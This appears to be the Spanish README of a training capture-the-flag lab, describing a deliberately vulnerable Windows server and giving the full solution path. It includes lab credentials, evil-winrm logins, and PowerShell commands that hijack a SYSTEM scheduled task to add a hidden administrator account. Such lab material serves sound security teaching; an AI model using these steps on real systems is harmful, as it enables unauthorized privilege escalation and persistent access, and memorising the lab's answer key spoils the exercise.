# Laboratorio FINAL BOSS

Este laboratorio pone a prueba la capacidad del alumno para identificar vulnerabilidades ocultas entre múltiples señuelos y explotar una mala configuración en un servidor Windows. A lo largo de este reto, los alumnos aprenderán a:

- Realizar reconocimiento web y fuzzing de directorios.
- Identificar archivos de respaldo expuestos.
- Conectarse a través de Evil-WinRM con credenciales encontradas.
- Escalar privilegios en Windows mediante una tarea programada vulnerable.
- Decodificar una flag oculta en base64.


## Especificaciones de la máquina 🖥️

- **Sistema:** Windows Server (GUI o Core con PowerShell)
- **Servicios activos:**
  - IIS (Puerto 80)
  - WinRM (Puerto 5985)
  - SSH (Opcional, señuelo)
  - FTP (Opcional, señuelo)
- **Sitio web:** Umbrella Corporation (sitio falso con señuelos LFI, SQLi)
- **Ruta del sitio:** `C:\inetpub\wwwroot`
- **Contenido vulnerable real:**
  - Carpeta: `/backup/web_backup.zip`
  - Contenido:
    ```php
    <?php
    $user = "wesker";
    $pass = "UmbrellaForever!";
    ?>
    ```
- **Usuario con acceso remoto:** `wesker`
- **Contraseña:** `UmbrellaForever!`
- **Script vulnerable:** `C:\Scripts\run.ps1` (editable por `wesker`)
- **Tarea programada:** `BackdoorScript` ejecuta `run.ps1` cada minuto como SYSTEM.
- **Flag:** `C:\Users\Administrator\Desktop\flag.txt`

### Credenciales de la máquina

```bash
hostname: finalboss-lab
username: Administrator
password: 4geeks-lab
```

## Pasos esperados por el alumno

1. **Realiza reconocimiento de red para identificar la máquina.**
   - Utiliza herramientas como `nmap`, `netdiscover` o `arp-scan`.
   - Debe detectar los puertos **80 (HTTP)** y **5985 (WinRM)** abiertos.

2. **Accede al sitio web desde el navegador.**
   - Visita `http://<IP>` y explora rutas como:
     ```
     index.php?page=home
     ```

3. **Realiza fuzzing de directorios.**
   - Usa herramientas como `gobuster` para descubrir:
     ```
     /backup/web_backup.zip
     ```

4. **Extrae las credenciales del archivo ZIP.**
   - El archivo `config.php` dentro del backup expone el usuario `wesker` y su contraseña.

5. **Conéctate por WinRM usando Evil-WinRM.**
   - Inicia sesión con:
     ```bash
     evil-winrm -i <IP> -u wesker -p 'UmbrellaForever!'
     ```

6. **Modifica el script vulnerable.**
   - Cambia el contenido de `C:\Scripts\run.ps1` por:
     ```powershell
     net user chris P@ssw0rd123 /add
     net localgroup administrators chris /add
     ```

7. **Espera 1 minuto a que se ejecute la tarea.**
   - El usuario `chris` será creado como administrador por el sistema.

8. **Conéctate como administrador.**
   - Accede usando:
     ```bash
     evil-winrm -i <IP> -u chris -p 'P@ssw0rd123'
     ```

9. **Lee la flag codificada.**
   - Ubicada en el escritorio del usuario `Administrator`:
     ```powershell
     type C:\Users\Administrator\Desktop\flag.txt
     ```

10. **Decodifica la flag.**
    - Copia el contenido base64 y decódificalo usando [CyberChef](https://gchq.github.io/CyberChef/) para obtener la flag en texto plano.



